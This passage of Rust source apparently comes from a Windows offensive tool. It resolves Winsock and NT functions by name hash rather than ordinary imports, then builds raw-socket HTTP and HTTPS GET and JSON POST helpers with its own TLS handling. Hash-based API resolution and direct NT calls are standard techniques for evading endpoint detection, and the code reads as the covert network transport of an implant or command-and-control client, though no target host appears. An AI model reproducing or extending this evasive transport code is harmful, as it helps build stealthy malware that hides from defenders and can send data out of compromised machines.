    let ws2_handle = fn_load(ws2_name.as_ptr());
    println!("[DEBUG] ws2_32 handle = {:?}", ws2_handle);

    if ws2_handle.is_null() {
        return None;
    }

    #[repr(C)]
    struct WsaData {
        w_version: u16,
        w_high_version: u16,
        i_max_sockets: u16,
        i_max_udp_dg: u16,
        lp_vendor_info: *mut u8,
        sz_description: [u8; 257],
        sz_system_status: [u8; 129],
    }

    type FnWSAStartup = unsafe extern "system" fn(u16, *mut WsaData) -> i32;
    let fn_wsa: FnWSAStartup =
        core::mem::transmute(get_proc_by_hash(ws2_handle, hash_str("WSAStartup"))?);
    let mut wsa_data: WsaData = core::mem::zeroed();
    fn_wsa(0x0202, &mut wsa_data);
    type FnGetAddrInfoW = unsafe extern "system" fn(
        *const u16,
        *const u16,
        *const c_void,
        *mut *mut GaiResult,
    ) -> i32;
    type FnFreeAddrInfoW = unsafe extern "system" fn(*mut GaiResult);

    #[repr(C)]
    struct GaiResult {
        flags: i32,
        family: i32,
        sock_type: i32,
        protocol: i32,
        addr_len: usize,
        canon_name: *mut u16,
        addr: *mut c_void,
        next: *mut GaiResult,
    }

    let gai_fn = get_proc_by_hash(ws2_handle, hash_str("GetAddrInfoW"));
    println!("[DEBUG] GetAddrInfoW = {:?}", gai_fn);
    let fn_gai: FnGetAddrInfoW = core::mem::transmute(gai_fn?);
    let fn_fai: FnFreeAddrInfoW =
        core::mem::transmute(get_proc_by_hash(ws2_handle, hash_str("FreeAddrInfoW"))?);

    let hostname_w = to_utf16(host);
    let mut results: *mut GaiResult = ptr::null_mut();
    let gai_ret = fn_gai(hostname_w.as_ptr(), ptr::null(), ptr::null(), &mut results);
    println!("[DEBUG] GetAddrInfoW ret={} results={:?}", gai_ret, results);
    if gai_ret != 0 {
        return None;
    }

    let mut ip = None;
    let mut cur = results;
    while !cur.is_null() {
        let r = &*cur;
        println!(
            "[DEBUG] GaiResult family={} addr_len={}",
            r.family, r.addr_len
        );
        if r.family == 2 && r.addr_len >= 16 {
            let sa = r.addr as *const u8;
            ip = Some([*sa.add(4), *sa.add(5), *sa.add(6), *sa.add(7)]);
            break;
        }
        cur = r.next;
    }
    fn_fai(results);
    ip
}

pub unsafe fn nt_request(
    ip: [u8; 4],
    port: u16,
    method: &str,
    host: &str,
    path: &str,
    headers: &[(&str, &str)],
    body: &[u8],
    use_tls: bool,
) -> Option<HttpResponse> {
    let handle = nt_create_socket();
    println!("[DEBUG] nt_create_socket handle = {:?}", handle);
    let handle = handle?;

    let sock = NtSocket { handle };

    let connected = nt_tcp_connect(handle, ip, port);
    println!(
        "[DEBUG] nt_tcp_connect({}.{}.{}.{}:{}) = {}",
        ip[0], ip[1], ip[2], ip[3], port, connected
    );
    if !connected {
        return None;
    }

    let req = build_request(method, host, path, headers, body);
    let mut raw_response = Vec::new();

    if use_tls {
        let tls = tls_handshake(&sock, host);
        println!("[DEBUG] tls_handshake = {}", tls.is_some());
        let mut tls = tls?;
        let sent = tls_send(&sock, &mut tls, &req);
        println!("[DEBUG] tls_send = {}", sent);
        loop {
            let mut chunk = Vec::new();
            if !tls_recv(&sock, &mut tls, &mut chunk) {
                println!(
                    "[DEBUG] tls_recv fin, raw_response len={}",
                    raw_response.len()
                );
                break;
            }
            raw_response.extend_from_slice(&chunk);
        }
        (tls.fn_free_cred)(&mut tls.cred);
        (tls.fn_del_ctx)(&mut tls.ctx);
    } else {
        let sent = nt_send_raw(handle, &req);
        println!("[DEBUG] nt_send_raw = {}", sent);
        let recvd = nt_recv_raw(handle, &mut raw_response);
        println!("[DEBUG] nt_recv_raw = {} len={}", recvd, raw_response.len());
    }

    if let Some(fn_close) = resolve_nt_fn(hash_str("NtClose")) {
        let f: unsafe extern "system" fn(*mut c_void) -> i32 = core::mem::transmute(fn_close);
        f(handle);
    }

    Some(parse_response(&raw_response))
}
pub unsafe fn http_get(host: &str, path: &str) -> Option<HttpResponse> {
    unsafe {
        let ip = resolve_host(host)?;
        nt_request(ip, 80, "GET", host, path, &[], &[], false)
    }
}

pub unsafe fn https_get(host: &str, path: &str) -> Option<HttpResponse> {
    unsafe {
        let ip = resolve_host(host)?;
        nt_request(ip, 443, "GET", host, path, &[], &[], true)
    }
}

pub unsafe fn https_post_json(host: &str, path: &str, json: &[u8]) -> Option<HttpResponse> {
    unsafe {
        let ip = resolve_host(host)?;
        nt_request(
            ip,
            443,
            "POST",
            host,
            path,
            &[("Content-Type", "application/json")],
            json,
            true,
        )
    }
}
